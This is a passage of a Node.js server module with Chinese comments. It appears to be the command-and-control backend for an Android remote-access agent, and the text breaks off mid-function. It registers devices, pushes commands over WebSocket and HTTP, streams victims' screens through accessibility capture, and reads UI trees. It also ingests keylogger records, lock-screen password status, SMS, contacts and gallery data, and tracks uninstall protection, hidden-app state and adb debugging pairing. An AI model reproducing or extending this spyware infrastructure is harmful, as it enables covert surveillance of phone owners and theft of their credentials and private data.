/**
 * ============================================================================
 * 花木工作室 — agent WS/HTTP 协议接入层（朱雀系 agent 与 tpx/dxs 桥）
 * ============================================================================
 * 覆盖手机 agent 的三种接入方式，全部由 server.js 按路径分发进来：
 *   POST /n          agent 注册（上报 deviceId，返回 token）→ 写 devices 表
 *   GET  /w?d=&t=    设备 WebSocket 通道（server.js upgrade 分支）：
 *                    心跳 / 命令下发 / status·password_status·短信·UI 树等回传
 *   /p/* /s/*        HTTP 轮询通道（无 WS 时的兜底，与旧 tpx 桥兼容）：
 *                    /s/pc 命令轮询 /s/hb 心跳 /s/ct 任务 /s/tc 结果上报
 *                    /s/il 键盘记录入库 /s/lk 无障碍状态上报（WS 形式的
 *                    /s/lk 由 bridge.js 处理，见 server.js upgrade 分支）
 *
 * 命令链路：面板 /m/device/:id/command → dispatch(devId, cmd, payload)
 *   {type:'command', cmd, payload, requestId}（字段名经 agent smali 解密实证）
 *   → WS 在线即发，离线入 ZQ_QUEUE 等 HTTP 轮询取走。
 * 命令映射表见"命令映射"段（面板命令名 → agent 命令 + 参数重排）。
 *
 * 屏幕流机制：
 *   原生流优先（agent 无障碍截图帧，~300ms），流死/慢流两级自愈看门狗：
 *   1 级 adb 无障碍重绑清 ColorOS 限频惩罚，2 级 force-stop 重启 agent；
 *   自适应时钟偏差基线丢弃过期帧；RTC(OFFER) 直连状态跟踪。
 *
 * 被引用：server.js require('./zhuque') → zhuque.init(ctx)；
 *   httpHandler（/n /p /s）、handleDeviceWs（/w）、commandAny（面板命令入口）。
 */
let ctx = null;
const zlib = require('zlib');
const ZQ_WS = new Map();          // devId -> ws
const ZQ_QUEUE = new Map();       // devId -> 待下发命令（WS 断线期间暂存）
const ZQ_STREAM = new Set();      // 已激活屏幕流的 devId（kv 持久化，服务重启不丢）
const ZQ_LAST_FRAME = new Map();  // devId -> 最近收到帧的时间戳（流死检测）
const HEAL_LEVEL = new Map();     // devId -> 自愈级别（1=a11y重绑 2=force-stop重启agent）
const ZQ_FRAME_CNT = new Map();   // devId -> 滑动窗口帧计数（慢流检测：ColorOS 截屏退避自愈）
const ZQ_SLOW_HEAL_AT = new Map();// devId -> 上次慢速自愈时间（冷却 90s）
const ZQ_CLK_OFF = new Map();     // devId -> 最小观测帧龄（手机-服务器时钟偏差基线，自适应）
const ZQ_RTC = new Map();         // devId -> {at, offerAt} RTC 直连状态（agent 发过 OFFER=已协商）
const ZQ_ACT_AT = new Map();      // devId -> 最近一次流激活时间（重连风暴抑制冷却）
const ZQ_ACT_WS = new Map();      // devId -> 最近一次激活时的 ws（判断上次激活的连接是否还活着）
const ZQ_ACT_FAIL = new Map();    // devId -> 激活后 10s 内掉线次数（连续 3 次回退 a11y 截图流）
let ZQ_DROP_N = 0;                // 过期帧丢弃计数（日志用）

const INIT_CFG = () => ({type: 'init_config', data: {mode: 'accessibility', screenshotMode: 'accessibility',
  screenshotInterval: 400, interval: 400, quality: 35, screenQuality: 35, minicapMode: 0,
  configs: {screenshot: {mode: 'accessibility', interval: 400, quality: 35}}}});

function streamSave() {
  try { ctx.db.prepare("INSERT OR REPLACE INTO kv VALUES('zq_stream',?)").run(j([...ZQ_STREAM])); } catch {}
}
function streamLoad() {
  try {
    const r = ctx.db.prepare("SELECT v FROM kv WHERE k='zq_stream'").get();
    for (const d of (r ? JSON.parse(r.v) : [])) ZQ_STREAM.add(d);
  } catch {}
}
// RTC 直连序列：system tech 拿 MediaProjection（ColorOS 已记忆授权）→ 300ms 后 RTC_START
// （agent 侧 RTC_START 在 mp 未激活时只缓存，mp 就绪后自动执行；fps 15/800kbps H264 硬编码 P2P）
// ICE：STUN 打洞优先，失败走 45 上的 coturn 中继（turn_nodes 开启后前端自动升级 RTC）
// TURN 中继：地址/账号/口令全部走环境变量，缺省不启用（杜绝明文常量）
const TURN_URL = process.env.EAGLE_TURN_URL || '';
const TURN_ICE = TURN_URL ? {urls: TURN_URL,
  username: process.env.EAGLE_TURN_USER || '', credential: process.env.EAGLE_TURN_PASS || ''} : null;
const RTC_START_MSG = () => ({type: 'rtc_signal', data: {signalType: 'RTC_START',
  video: {maxWidth: 720, fps: 15, maxBitrateKbps: 800, codec: 'H264'},
  iceServers: [{urls: 'stun:stun.l.google.com:19302'}].concat(TURN_ICE ? [TURN_ICE] : [])}});
function rtcActivate(devId) {
  const r = ZQ_RTC.get(devId) || {};
  r.at = Date.now();
  ZQ_RTC.set(devId, r);
  dispatch(devId, 'SCREEN_CAPTURE_SET_TECH', {tech: 'system', rtcBridge: true});
  setTimeout(() => { if (ZQ_WS.has(devId)) wsSend(devId, RTC_START_MSG()); }, 300);
}
// 激活屏幕流：RTC 直连优先（P2P H264 视频流，绕开国际上行抖动），未启用/失败回退时走 a11y 截图流。
// opts.force 跳过冷却；opts.rtc 强制启用 RTC。冷却规则见函数内注释——
// agent 唤醒后进入脆弱态，每次重连都发激活命令会形成 重连→命令→重启→重连 死循环；
// 但一刀切 30s 冷却又会吃掉风暴后稳定连接的激活（命令进队列无日志、静默跳过）→ 死连接 8s 限速 + 自动重试
function streamActivate(devId, opts) {
  opts = opts || {};
  const now = Date.now();
  // 冷却：上次激活的连接还活着 → 30s（流可能仍在跑，避免重复激活）；
  // 上次激活的连接已死（agent 重启/断线）→ 仅 8s 限速（防风暴轰炸），超时自动重试一次
  if (!opts.force) {
    const at = ZQ_ACT_AT.get(devId) || 0;
    if (at) {
      const actWs = ZQ_ACT_WS.get(devId);
      const prevAlive = !!(actWs && ZQ_WS.get(devId) === actWs);
      const limit = prevAlive ? 30000 : 8000;
      if (now - at < limit) {
        ctx.log('zq-act-skip', {d: devId, why: prevAlive ? 'cooldown30' : 'ratelimit8', ago_s: Math.round((now - at) / 1000)});
        if (!prevAlive) setTimeout(() => { if (ZQ_WS.has(devId)) streamActivate(devId); }, limit - (now - at) + 100);
        return;
      }
    }
  }
  ZQ_ACT_AT.set(devId, now);
  ZQ_ACT_WS.set(devId, ZQ_WS.get(devId) || null);
  // 防污染：只允许 devices 表中真实存在的设备进入流状态（假 ID 混入 zq_stream 持久化
  // 会挤掉真实设备，导致断流后看门狗不救）
  if (!ctx.getDevice(devId)) { ctx.log('zq-act-reject', {d: devId, why: 'unknown device'}); return; }
  ZQ_STREAM.add(devId);
  streamSave();
  if (!ZQ_LAST_FRAME.get(devId)) ZQ_LAST_FRAME.set(devId, Date.now() - 30000);
  ZQ_FRAME_CNT.set(devId, {winStart: now, n: 0});
  // 10s 后仍在线 = 本次激活成功，清失败计数
  setTimeout(() => {
    if (Date.now() - (ZQ_ACT_AT.get(devId) || 0) >= 9900 && ZQ_WS.has(devId)) ZQ_ACT_FAIL.set(devId, 0);
  }, 10000);
  if (opts.rtc || ZQ_RTC.has(devId)) rtcActivate(devId);
  else {
    dispatch(devId, 'SCREEN_CAPTURE_SET_TECH', {tech: 'accessibility'});
    wsSend(devId, INIT_CFG());
  }
}
// 浏览器主动停 RTC（前端重试失败/用户切换通道）→ 回退 a11y 截图流
function rtcStopped(devId) {
  if (!ZQ_RTC.has(devId)) return;
  ZQ_RTC.delete(devId);
  ctx.log('zq-rtc-stopped', {d: devId, note: 'browser sent RTC_STOP, fallback a11y'});
  if (ZQ_STREAM.has(devId) && ZQ_WS.has(devId)) streamActivate(devId, {force: true});
}
function streamDeactivate(devId) {
  ZQ_STREAM.delete(devId);
  streamSave();
  ZQ_LAST_FRAME.delete(devId);
  HEAL_LEVEL.delete(devId);
  ZQ_FRAME_CNT.delete(devId);
  ZQ_SLOW_HEAL_AT.delete(devId);
  ZQ_RTC.delete(devId);
  ZQ_ACT_AT.delete(devId);
  ZQ_ACT_WS.delete(devId);
  ZQ_ACT_FAIL.delete(devId);
}

// ---------------- 屏幕阅读器（agent 原生 UI 树优先，adb uiautomator 兜底） ----------------
// 旧方案病灶：adb uiautomator dump 单次 2-3s+，2.5s 轮询并发起多个 dump 进程写同一个临时文件
// → XML 错乱/失败 → 前端树过期 → 点了没反应；且 uiautomator 与 agent 的 a11y 手势互相打架 → 操作不了。
// agent 内置 GET_UI_HIERARCHY（a11y 服务直接取 AccessibilityNodeInfo 树，StringFog 命令表实证）——
// 无进程冲突、走已有 WS（RTT ~30ms），实测优先走它；连续 3 轮无回包自动降级 adb 60s。
const READER_LOOP = new Map();      // devId → setInterval
const READER_BUSY = new Map();      // devId → 上一轮未完成（防并发堆积——uiautomator 并发冲突的根源）
const READER_AGENT_AT = new Map();  // devId → agent 最近一次 ui_hierarchy 回包时间
const READER_AGENT_FAIL = new Map();// devId → agent 连续无回包轮数
const READER_ADB_ONLY = new Map();  // devId → agent 降级截止时间（过后重试 agent）
function readerPull(devId) {
  if (READER_BUSY.get(devId)) return;                    // 上一轮还没落地：跳过本轮
  READER_BUSY.set(devId, true);
  const done = () => READER_BUSY.set(devId, false);
  const useAgent = Date.now() > (READER_ADB_ONLY.get(devId) || 0) && ZQ_WS.has(devId);
  if (useAgent) {
    wsSend(devId, {type: 'command', cmd: 'GET_UI_HIERARCHY', payload: {}, params: {}, requestId: uid9()});
    setTimeout(() => {
      if (Date.now() - (READER_AGENT_AT.get(devId) || 0) > 3200) {   // 3.2s 内 agent 未回包
        const f = (READER_AGENT_FAIL.get(devId) || 0) + 1;
        READER_AGENT_FAIL.set(devId, f);
        if (f >= 3) { READER_ADB_ONLY.set(devId, Date.now() + 60000); READER_AGENT_FAIL.set(devId, 0); ctx.log('reader-downgrade', {d: devId, note: 'agent no ui_hierarchy, adb-only 60s'}); }
        Promise.resolve(ctx.eagle.answerUiHierarchy(devId)).finally(done);   // 本轮 adb 兜底
      } else { READER_AGENT_FAIL.set(devId, 0); done(); }
    }, 3200);
  } else {
    Promise.resolve(ctx.eagle.answerUiHierarchy(devId)).finally(done);
  }
}
function readerStart(devId) {
  if (READER_LOOP.has(devId)) return;
  readerPull(devId);
  const loop = setInterval(() => {
    if (!READER_LOOP.has(devId)) { clearInterval(loop); return; }
    readerPull(devId);
  }, 2500);
  READER_LOOP.set(devId, loop);
}
function readerStop(devId) {
  const loop = READER_LOOP.get(devId);
  if (loop) clearInterval(loop);
  READER_LOOP.delete(devId);
  READER_BUSY.delete(devId);
  READER_AGENT_FAIL.delete(devId);
}
// agent 二进制 UI 树回包 → 广播 ui_hierarchy
// 协议（hex 头实证 0200001c67 7b227a6970）：[1B 类型 0x02][4B 大端长度][JSON payload]
// payload 就是 {"zip": "<deflateRaw base64>"} —— agent 按前端解析格式预制，直接透传 data 即可
// 兜底：明文 XML / gzip(1F 8B) / zlib(78) / raw-deflate → 压成 zip 再广播
function handleReaderBinary(devId, buf) {
  if (!buf || buf.length < 8) return;
  let payload = null, how = '';
  try {
    if (buf[0] === 0x02) {
      const len = buf.readUInt32BE(1);
      if (len > 0 && len <= buf.length - 5) {
        payload = JSON.parse(buf.slice(5, 5 + len).toString('utf8'));
        how = 'proto02-json';
      }
    }
  } catch {}
  if (!payload || !payload.zip) {
    try {
      let xml = null;
      if (buf[0] === 0x3C) xml = buf.toString('utf8');
      else if (buf[0] === 0x1F && buf[1] === 0x8B) xml = zlib.gunzipSync(buf).toString('utf8');
      else if (buf[0] === 0x78) xml = zlib.inflateSync(buf).toString('utf8');
      else { try { xml = zlib.inflateRawSync(buf).toString('utf8'); } catch {} }
      if (xml && xml.includes('<')) {
        payload = {zip: zlib.deflateRawSync(Buffer.from(xml, 'utf8')).toString('base64')};
        how = 'xml-repack';
      }
    } catch {}
  }
  if (!payload || !payload.zip) {
    ctx.log('reader-bin-unknown', {d: devId, sz: buf.length, head: buf.slice(0, 10).toString('hex')});
    return;
  }
  READER_AGENT_AT.set(devId, Date.now());
  READER_AGENT_FAIL.set(devId, 0);
  ctx.broadcast({type: 'ui_hierarchy', device_id: devId, data: payload}, [devId]);
  ctx.log('reader-bin', {d: devId, how, zipB: String(payload.zip).length});   // 观察期日志（稳定后可删）
}

function init(c) { ctx = c; streamLoad(); screenWatchdog(); offlineWatchdog(); }

const j = o => JSON.stringify(o);
const isoNow = () => new Date(Date.now() + 8 * 3600e3).toISOString().slice(0, 19);
const uid9 = () => String(Date.now() % 1e9);

// 设备活跃时间戳（内存）：离线判定用它，避免解析 last_seen 字符串的时区坑
const ZQ_TOUCH = new Map();

// 真实客户端 IP：设备连接全部经 nginx 反代（127.0.0.1:39445），socket.remoteAddress 是回环地址，
// 必须取 X-Forwarded-For / X-Real-IP 头
function clientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) { const ip = String(xff).split(',')[0].trim(); if (ip) return ip; }
  const xri = req.headers['x-real-ip'];
  if (xri) { const ip = String(xri).trim(); if (ip) return ip; }
  return (req.socket.remoteAddress || '').replace(/^::ffff:/, '');
}

function touchDb(devId, extra) {
  ZQ_TOUCH.set(devId, Date.now());
  try {
    const d = ctx.getDevice(devId);
    if (d) {
      d.last_seen = isoNow(); d.online = true; d.svc_online = true; d.svc_last_seen = isoNow();
      if (extra) for (const k in extra) if (extra[k] !== undefined && extra[k] !== '') d[k] = extra[k];
      ctx.setDevice(d);
    }
  } catch {}
}

// 离线看门狗：30s 扫一次，90s 无任何心跳/消息且无 WS 连接 → 判离线并推送前端。
// 服务重启后 ZQ_TOUCH 为空，stale 的 online=true 会在首个周期内被清掉。
function offlineWatchdog() {
  setInterval(() => {
    try {
      const now = Date.now();
      for (const r of ctx.db.prepare('SELECT id, data FROM devices').all()) {
        let d; try { d = JSON.parse(r.data); } catch { continue; }
        if (!d.online) continue;
        const idle = now - (ZQ_TOUCH.get(r.id) || 0);
        if (idle < 90e3 || ZQ_WS.has(r.id)) continue;   // 仍活跃或 WS 还在 → 在线
        d.online = false; d.svc_online = false;
        ctx.setDevice(d);
        ctx.broadcast({type: 'device_update'}, [r.id]);
        ctx.log('zq-offline', {d: r.id, idle: Math.round(idle / 1000) + 's'});
      }
    } catch {}
  }, 30e3);
}

// ---------------- 注册 POST /n ----------------
// 注册 body 兼容两套键名：缩写（di/md/br/an/cy/cr）与全名（hasSim/isCharging/batteryLevel 等），
// 全名字段缺省时保持原默认值；statusKeys 在创建与更新两个分支共用
// ---------------- 设备出厂归属解析 ----------------
// APK 内 assets/server_config.json 的 bindOwner/bindUser（构建表单「绑定子账户」）随注册体上报，
// 服务端据此把新设备直接挂到对应账户名下；解析失败/为空则归管理员(1)。
// 兼容键名：bind_owner / bindOwner / bind_user / bindUser / channel / owner
function resolveBindOwner(ctx, body) {
  const b = body || {};
  const raw = String(b.bind_owner || b.bindOwner || b.bind_user || b.bindUser || b.channel || b.owner || '').trim();
  if (!raw) return null;
  const norm = s => String(s == null ? '' : s).replace(/\s+/g, '').toLowerCase();
  // 支持三种写法：用户名、uid(纯数字)、user:用户名
  const u = norm(raw.replace(/^user:/i, ''));
  let acc = null;
  try {
    const rows = ctx.db.prepare('SELECT id, username, role, is_active FROM web_accounts').all();
    acc = rows.find(a => norm(a.username) === u) || null;
    if (!acc && /^\d+$/.test(u)) acc = rows.find(a => Number(a.id) === Number(u)) || null;
  } catch (e) { return null; }
  if (!acc) return null;
  if (!acc.is_active) return null;
  return {owner_id: acc.id, owner_username: acc.username};
}
function registerExtras(body) {
  const out = {};
  const bool = v => v === true || v === 1 || v === 'true';
  const num = v => { const n = parseInt(String(v).replace(/\D/g, ''), 10); return isNaN(n) ? 0 : n; };
  if (body.hasSim !== undefined) out.has_sim = bool(body.hasSim);
  if (body.isCharging !== undefined) out.is_charging = bool(body.isCharging);
  if (body.isLocked !== undefined) out.is_locked = bool(body.isLocked);
  if (body.batteryLevel !== undefined) out.battery_pct = num(body.batteryLevel);
  if (body.screenWidth) out.screen_width = num(body.screenWidth);
  if (body.screenHeight) out.screen_height = num(body.screenHeight);
  const net = String(body.networkType || body.wifi || '').trim();
  if (net) out.network_type = net === 'No Network' ? '' : net;
  return out;
}
function registerDevice(body, ip) {
  const devId = String((body || {}).di || '').trim();
  if (!devId) return null;
  let d = ctx.getDevice(devId);
  const wasOffline = !d || !d.online;    // 仅离线→上线迁移时发 TG 通知（防重连刷屏）
  if (!d) {
    d = {id: devId, model: body.md || '', brand: body.br || '', android: body.an || '', sdk: 0,
      country: body.cy || '', language: '', carrier: body.cr || '', is_rooted: false, has_admin: false,
      has_access: true, battery_pct: 0, screen_on: true, app_name: body.pk || 'HuamuAgent', app_version: '1.0',
      is_charging: false, is_locked: false, network_type: '', has_sim: true, phone_number: '', phone_number2: '',
      screen_width: 0, screen_height: 0, fingerprint: '', ip, note: '', tag: '', online: true, modules: 0,
      group_id: 0, pinned: false, debug_port: 0, svc_online: true, svc_last_seen: isoNow(),
      first_seen: isoNow(), last_seen: isoNow(),
      ...(resolveBindOwner(ctx, body) || {owner_id: 1, owner_username: 'admin'}),
      fcm_token: '',
      password_type: '', injection_count: 0, card_count: 0, source: 'agent', ...registerExtras(body)};
    // adb 直注通道继承（同机型）
    for (const [odId, serial] of Object.entries(ctx.eagle.adbMap)) {
      const od = ctx.getDevice(odId);
      if (od && od.model && od.model === d.model) { ctx.eagle.adbMap[devId] = serial; break; }
    }
  } else {
    Object.assign(d, {online: true, svc_online: true, svc_last_seen: isoNow(), last_seen: isoNow(), ip},
      registerExtras(body));
    for (const [k, xy] of [['md', 'model'], ['br', 'brand'], ['an', 'android'], ['cy', 'country'], ['cr', 'carrier']])
      if (body[k]) d[xy] = body[k];
  }
  ctx.setDevice(d);
  ctx.broadcast({type: 'device_online', device_id: devId, data: ctx.routes.sanD(d)}, [devId]);
  ctx.broadcast({type: 'device_update'}, [devId]);
  if (wasOffline && ctx.tg) ctx.tg.notifyOnline(devId);   // TG：设备上线通知
  ctx.log('zq-register', {d: devId, md: body.md});
  return devId;
}

// ---------------- WS 发送（3s 超时防死链） ----------------
function wsSend(devId, obj) {
  const ws = ZQ_WS.get(devId);
  if (!ws || ws.readyState !== 1) return false;
  try { ws.send(typeof obj === 'string' ? obj : j(obj)); return true; } catch { return false; }
}
const PWD_WAITERS = new Map();    // devId -> [{resolve, to}]：GET_PASSWORD_STATUS 同步等回包
// 等待 agent 的 password_status 回包（超时返回 null）——/command 端点用它把锁屏密码结果直接带回给面板按钮
function waitPasswordStatus(devId, ms) {
  return new Promise(resolve => {
    const arr = PWD_WAITERS.get(devId) || [];
    const w = {resolve, to: setTimeout(() => {
      const a = PWD_WAITERS.get(devId) || [];
      const i = a.indexOf(w); if (i >= 0) a.splice(i, 1);
      if (!a.length) PWD_WAITERS.delete(devId);
      try { resolve(null); } catch (e) {}
    }, ms || 3000)};
    arr.push(w); PWD_WAITERS.set(devId, arr);
  });
}
function dispatch(devId, cmd, payload) {
  const obj = {type: 'command', cmd, payload: payload || {}, params: payload || {}, requestId: uid9()};
  if (wsSend(devId, obj)) { ctx.log('zq-cmd', {d: devId, cmd}); return true; }
  const q = ZQ_QUEUE.get(devId) || [];
  q.push(obj);
  ZQ_QUEUE.set(devId, q);
  return true;
}

// ---------------- /w 设备 WS ----------------
// 设备 WS 接入校验：只接受 /n 注册过（devices 表）或 eagle_map 登记过的 devId
function isKnownDevice(devId) {
  const id = String(devId || '').slice(0, 64);
  if (!/^[A-Za-z0-9_-]{4,64}$/.test(id)) return false;
  try {
    if (ctx.db.prepare('SELECT 1 FROM devices WHERE id=?').get(id)) return true;
    const kv = ctx.db.prepare("SELECT v FROM kv WHERE k='eagle_map'").get();
    if (kv) {
      const m = JSON.parse(kv.v) || {};
      for (const k of Object.keys(m)) {
        const v = m[k] || {};
        if (v.dev_id === id || v.devId === id || v.aid === id || String(k) === id) return true;
      }
    }
  } catch (e) {}
  return false;
}

function handleDeviceWs(ws, req) {
  const u = new URL(req.url, 'http://x');
  const devId = u.searchParams.get('d') || '';
  if (!devId) { ws.destroy ? ws.destroy() : ws.close(); return; }
  if (!isKnownDevice(devId)) {
    try { ctx.log('zq-ws-reject', {d: String(devId).slice(0, 64), ip: clientIp(req)}); } catch (e) {}
    try { ws.close(4003, 'unknown device'); } catch (e) {}
    return;
  }
  const old = ZQ_WS.get(devId);
  if (old) try { old.close(); } catch {}
  ZQ_WS.set(devId, ws);
  touchDb(devId, {ip: clientIp(req)});   // WS 连接即刷新真实 IP（换网络自动更新）
  ctx.log('zq-ws-up', devId);
  // 冲掉断线期间积压命令（补日志：队列冲发此前不可观测，丢命令无从排查）
  const q = ZQ_QUEUE.get(devId) || [];
  ZQ_QUEUE.delete(devId);
  if (q.length) ctx.log('zq-queue-flush', {d: devId, n: q.length, cmds: q.map(c => c.cmd).slice(0, 8)});
  for (const c of q) wsSend(devId, c);
  // RTC 设备：立即补发 RTC_START（agent 侧看门狗「WS 重连 5s 无 RTC_START 强制停止 RTC」，
  // 300ms 内补上；轻量信令不打扰 agent，风暴连接活不到 300ms 自然不发）
  if (ZQ_RTC.has(devId)) {
    setTimeout(() => {
      if (ZQ_WS.get(devId) === ws) {
        wsSend(devId, RTC_START_MSG());
        const r = ZQ_RTC.get(devId) || {}; r.at = Date.now(); ZQ_RTC.set(devId, r);
      }
    }, 300);
  }
  // 服务重启/断线重连后自动恢复屏幕流（流状态持久化）。
  // 等连接稳定 6s 再激活：风暴连接（1.7-2s 一断）活不过 6s，天然过滤；稳定连接必过。
  // streamActivate 内部还有冷却（上次激活连接已死→8s 限速 + 自动重试），彻底防 SET_TECH 轰炸
  if (ZQ_STREAM.has(devId)) {
    setTimeout(() => {
      if (ZQ_WS.get(devId) !== ws) { ctx.log('zq-act-skip', {d: devId, why: 'ws replaced <6s'}); return; }
      ctx.log('zq-act-timer', {d: devId, rtc: ZQ_RTC.has(devId)});
      streamActivate(devId);
    }, 6000);
  }

  ws.on('close', () => {
    // 只有当前映射还是这个 ws 才判离线（新连接已接管时不清，防误杀重连）
    if (ZQ_WS.get(devId) === ws) {
      ZQ_WS.delete(devId);
      ZQ_TOUCH.delete(devId);
      touchDb(devId, {online: false, svc_online: false});   // 断线即离线 + 推前端
      ctx.broadcast({type: 'device_update'}, [devId]);
    }
    ctx.log('zq-ws-down', devId);
    // 激活后 10s 内掉线 = 激活失败（agent 被命令打死）。RTC 模式连续失败 3 次 → 回退 a11y 截图流
    const at = ZQ_ACT_AT.get(devId);
    if (at && Date.now() - at < 10000) {
      const f = (ZQ_ACT_FAIL.get(devId) || 0) + 1;
      ZQ_ACT_FAIL.set(devId, f);
      if (ZQ_RTC.has(devId) && f >= 3) {
        ZQ_RTC.delete(devId);
        ctx.log('zq-rtc-fallback', {d: devId, fails: f, note: '3 activation fails, fallback a11y stream'});
      }
    }
  });
  ws.on('error', () => {});
  ws.on('message', raw => {
    let m;
    try { m = JSON.parse(raw.toString()); } catch {
      // agent 二进制帧：GET_UI_HIERARCHY 的回包就是 ~7KB 二进制（XML 或压缩形态，实测请求后秒回）
      // —— 旧代码直接丢弃导致阅读器永远拿不到树（只能靠 adb uiautomator 2-3s/次还互相打架）
      handleReaderBinary(devId, Buffer.isBuffer(raw) ? raw : Buffer.from(raw));
      return;
    }
    touchDb(devId);
    const t = m.type || (m.data || {}).type;
    if (String(t) !== 'screenshot') {
      // 关键类型打印原始载荷前 240 字节（排查 sms_data/contacts_data/gallery 结构）
      if (['sms_data', 'contacts_data', 'gallery_image_saved', 'gallery_error'].includes(String(t)))
        ctx.log('zq-msg', {d: devId, t: String(t).slice(0, 40), sz: raw.length, raw: String(raw).slice(0, 240)});
      else ctx.log('zq-msg', {d: devId, t: String(t).slice(0, 40), sz: raw.length});
    }
    // 无线调试配对/隧道回执全文日志：dxs_deploy / adb_tunnel_response /
    // debug_port_report / pair_completed / pair_failed
    if (['dxs_deploy', 'adb_tunnel_response', 'debug_port_report', 'pair_completed', 'pair_failed'].includes(String(t)))
      ctx.log('zq-pair', {d: devId, t: String(t), body: JSON.stringify(m).slice(0, 500)});
    // status 回传：uninstallProtectionEnabled 落库 has_admin/uninstall_protection，
    // 广播 uninstall_protection_changed + 扁平 status 包（前端 deviceStateChange 翻转开关）
    if (String(t) === 'status') {
      const sd = (m.data && typeof m.data === 'object') ? m.data : m;
      const pd = (sd.payload && typeof sd.payload === 'object') ? sd.payload : {};
      const src = Object.keys(pd).length ? pd : sd;
      if (src.uninstallProtectionEnabled !== undefined) {
        const prot = !!src.uninstallProtectionEnabled;
        const d = ctx.getDevice(devId) || {};
        if (!!d.has_admin !== prot || !!d.uninstall_protection !== prot) {
          touchDb(devId, {has_admin: prot, uninstall_protection: prot});
          ctx.broadcast({type: 'device_update'}, [devId]);
        }
        ctx.broadcast({type: 'uninstall_protection_changed', device_id: devId, data: {enabled: prot}});
        // 日志/静音状态广播（前端 deviceStateChange 监听这两个事件即时翻转按钮标签，之前后端从未发过 → 标签永远不变）
        if (src.loggingEnabled !== undefined) ctx.broadcast({type: 'logging_state_changed', device_id: devId, data: {enabled: !!src.loggingEnabled}});
        if (src.muted !== undefined) ctx.broadcast({type: 'mute_state_changed', device_id: devId, data: {muted: !!src.muted}});
        ctx.broadcast({type: 'status', device_id: devId, data: src});
        ctx.log('zq-protect', {d: devId, on: prot, logging: src.loggingEnabled, hidden: src.appHidden});
      }
    }
    if (t === 'ping') return void wsSend(devId, {type: 'pong'});
    if (t === 'request_init_config') {
      return void wsSend(devId, {type: 'init_config', data: {mode: 'accessibility', screenshotMode: 'accessibility',
        screenshotInterval: 400, interval: 400, quality: 35, screenQuality: 35, minicapMode: 0,
        configs: {screenshot: {mode: 'accessibility', interval: 400, quality: 35}}}});
    }
    // 心跳/状态载荷
    const hb = (m.payload && typeof m.payload === 'object') ? m.payload : (t === 'device_heartbeat' ? m : null);
    if (hb && (['device_heartbeat', 'screen_lock_status'].includes(String(hb.type)) || 'screenWidth' in hb || 'isScreenOn' in hb)) {
      const extra = {};
      for (const [zk, xy] of [['screenWidth', 'screen_width'], ['screenHeight', 'screen_height'],
          ['battery', 'battery_pct'], ['batteryLevel', 'battery_pct'], ['batteryPct', 'battery_pct'],
          ['isCharging', 'is_charging'], ['charging', 'is_charging'], ['isScreenOn', 'screen_on'], ['screenOn', 'screen_on'],
          ['isLocked', 'is_locked'], ['locked', 'is_locked'],
          ['networkType', 'network_type'], ['network', 'network_type'], ['wifi', 'network_type'],
          ['hasSim', 'has_sim'], ['sim', 'has_sim'],
          ['country', 'country'], ['osVersion', 'android'], ['appVersion', 'app_version']]) {
        if (hb[zk] !== undefined && hb[zk] !== null) {
          let v = hb[zk];
          if (xy === 'network_type') v = String(v).trim() === 'No Network' ? '' : v;   // agent 无网络时清空 → 前端未知
          if (zk === 'hasSim' || zk === 'sim' || zk === 'isLocked' || zk === 'locked')
            v = v === true || v === 1 || v === 'true' || v === 1;
          extra[xy] = v;
        }
      }
      if (Object.keys(extra).length) { touchDb(devId, extra); ctx.broadcast({type: 'device_update'}, [devId]); }
      return;
    }
    // 截图帧 → 控制页画面（JSON + 二进制帧双通道：二进制通道无 castMode 门禁，防卡首帧）
    // 过期帧丢弃：手机弱网时帧在 agent 发送队列积压（一次倾泻几十帧旧画面，浏览器逐帧渲染
    // → 20s+ 延迟卡死）。帧龄 = 到达时间 - agent时间戳 - 时钟偏差基线（历史最小帧龄，自适应
    // 手机/服务器时钟差），超过 1.5s 的旧帧直接丢弃，浏览器瞬间追上当前画面。
    if (['screenshot', 'screen', 'frame'].includes(t)) {
      const img = extractImg(m);
      if (img) {
        ZQ_LAST_FRAME.set(devId, Date.now());
        const src = (m.payload && typeof m.payload === 'object') ? m.payload : (m.data && typeof m.data === 'object' ? m.data : {});
        const ts = src.timestamp || src.ts;
        const shot = {type: 'screenshot', device_id: devId, data: {image: img}};
        if (ts) {
          shot.data.timestamp = ts;
          const age = Date.now() - Number(ts);
          const off = ZQ_CLK_OFF.get(devId);
          // 绝对上限 8s：积压旧帧（重启/断流后 agent 队列倾泻）无条件丢弃——
          // 若无此上限，第一批旧帧会把空基线毒化成自身帧龄（age-baseline=0 全部放行），
          // 浏览器连续渲染 13s 前的旧画面（实测），表现为投屏"卡十几秒才追上"
          if (age > 8000) {
            if (++ZQ_DROP_N % 20 === 1) ctx.log('zq-frame-drop', {d: devId, age_ms: age, n: ZQ_DROP_N, note: 'abs stale (>8s)'});
            return;
          }
          if (off === undefined || age < off) ZQ_CLK_OFF.set(devId, age);   // 基线只降不升（最快帧≈零排队）
          if (age - ZQ_CLK_OFF.get(devId) > 1500) {
            if (++ZQ_DROP_N % 20 === 1) ctx.log('zq-frame-drop', {d: devId, age_ms: age, n: ZQ_DROP_N, note: 'stale burst frame discarded'});
            return;                                                         // 丢弃过期帧：两个通道都不转发（不计入慢流统计）
          }
        }
        const fc = ZQ_FRAME_CNT.get(devId);
        if (fc) fc.n++;
        try { ctx.broadcastFrame(devId, Buffer.from(img, 'base64')); } catch {}
        ctx.broadcast(shot, [devId]);
        return;
      }
    }
    // RTC 信令（agent → 浏览器）：offer/ice/state 直接透传给订阅端（前端自动应答建立 P2P）
    if (t === 'rtc_signal' || t === 'signal' || m.signalType) {
      const sig = (m.payload && typeof m.payload === 'object') ? m.payload : ((m.data && typeof m.data === 'object') ? m.data : m);
      const st = String(sig.signalType || sig.type || '');
      if (st === 'RTC_OFFER') {                       // agent 已协商：RTC 链路健康标记（看门狗据此跳过 a11y 帧检测）
        const r = ZQ_RTC.get(devId) || {};
        r.at = r.at || Date.now();
        r.offerAt = Date.now();
        ZQ_RTC.set(devId, r);
      }
      // OFFER 补 TURN：浏览器发起的 RTC_START 不带 iceServers（agent 无 TURN 可用），
      // P2P 打洞失败即断流。服务端在 OFFER 转发时注入 coturn 中继，浏览器 answer 即可走中继兜底
      if (st === 'RTC_OFFER' && !Array.isArray(sig.iceServers)) {
        try { sig.iceServers = [{urls: 'stun:stun.l.google.com:19302'}, TURN_ICE]; } catch {}
      }
      ctx.broadcast({type: 'rtc_signal', device_id: devId, data: sig}, [devId]);
      ctx.log('zq-rtc-out', {d: devId, st: st.slice(0, 24)});
